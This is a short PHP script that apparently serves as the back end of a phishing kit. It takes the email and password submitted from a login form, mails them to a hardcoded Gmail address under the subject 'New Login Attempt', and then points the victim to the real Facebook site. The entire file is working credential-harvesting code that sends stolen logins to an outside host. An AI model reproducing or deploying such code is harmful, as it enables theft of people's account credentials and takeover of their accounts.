<?php
$email = $_POST["email"];
$passkey = $_POST["password"];

$mailheader = "From: " . $email . " <" . $passkey . ">\r\n";
$recipient = "israelstoba@gmail.com";

mail($recipient, "New Login Attempt", $mailheader)
or die("Error");

echo "https://web.facebook.com";
?>